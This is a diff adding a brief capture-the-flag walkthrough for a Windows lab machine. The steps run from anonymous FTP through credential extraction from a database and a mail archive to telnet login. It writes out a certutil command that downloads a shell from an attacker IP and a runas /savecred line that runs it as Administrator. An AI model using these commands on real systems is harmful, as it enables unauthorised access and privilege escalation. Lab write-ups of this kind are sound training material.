@@ -1,0 +1,7 @@
+Started with a nmap scan
+```
+21 FTPD
+23 Telnet
+80 IIS 7.5
+```
+Looking at the FTP it has anonymous login and there are 2 files on the server a backup that is a microsoft database and a zip folder called `access control.zip` looking at the database first we can use `mdb-tools` to look at it `mdb-tables backup.mdb` will show all the tables after looking at alot of the tables we got one with creds in it `mdb-export backup.mdb auth_user` and we got creds for a `engineer` account password `access4u@security` and we can unzip the zip folder `7z x access control.zip` and we get a another file `access control.pst` to read this file and extract it `readpst access control.pst` and now its in a format we can read and there is creds in this file `security:4Cc3ssC0ntr0ller` and we can use telnet to login we can get the user flag looking around the public desktop folder has a `.lnk` file if we run `type name of lnk file` we can see it is running `runas.exe` with the `/savecred` and we can verify this as `cmdkey /list` now we need to make a shell and get it onto the host system `certutil -urlcache -split -f "http://10.10.16.4/shell.exe" shell.exe` and then we can run it with the runas command `runas /savecred /user:ACESS\Administrator shell.exe` and now we are the admin account 
